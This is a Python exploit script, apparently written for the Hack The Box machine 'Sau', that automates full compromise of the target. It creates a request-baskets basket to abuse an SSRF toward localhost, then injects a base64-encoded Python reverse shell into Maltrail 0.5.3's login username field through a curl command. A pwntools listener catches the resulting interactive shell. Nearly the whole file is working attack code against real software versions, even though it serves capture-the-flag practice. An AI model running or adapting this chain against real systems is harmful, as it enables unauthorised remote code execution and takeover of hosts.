#!/usr/bin/env python3
# Author: Juan Garcia aka liandd
import sys
import signal
from termcolor import colored
import argparse
import random
import string
import threading
from pwn import *
import subprocess
import requests
import base64


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Sau", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://10.129.229.26)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


# Variables Globales
request_basket_port = 55555
api_url = "/api/baskets/"


def createBasket(URL):
    p1 = log.progress("Creating Basket")
    p1.status("Loading")

    global basket_name
    basket_name = ''.join(random.choices(string.ascii_lowercase, k=6))

    payload = {"forward_url": "http://localhost", "proxy_response": True,
               "insecure_tls": False, "expand_path": True, "capacity": 250}

    p1.status(payload)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = f"{URL}:{request_basket_port}{api_url}{basket_name}"

    try:
        r = requests.post(full_url, headers=headers, json=payload, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    if r.status_code == 201:
        p1.status("Succesfully uploaded payload!!")
        print(colored(f"[+] Basket created - {basket_name}", "green"))
    else:
        print(colored("\n\n[!] FATAL: Could not properly request %s. Is the server online?" %
              full_url, "red"))
        sys.exit(1)


def maltrailExploit(url, IP, PORT):
    target_url = url+'/login'
    p2 = log.progress(colored("Exploiting Maltrail 0.5.3", "red"))

    reverse = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'' % (
        IP, PORT)
    reverse_base64 = base64.b64encode(reverse.encode()).decode()
    command = f"curl '{target_url}' --data 'username=;`echo+\"{reverse_base64}\"+|+base64+-d+|+sh`'"
    os.system(command)


def main():
    URL, IP, PORT = get_arguments()
    createBasket(URL)

    basket_url = URL+':'+str(request_basket_port)+'/'+basket_name
    try:
        threading.Thread(target=maltrailExploit,
                         args=(basket_url, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
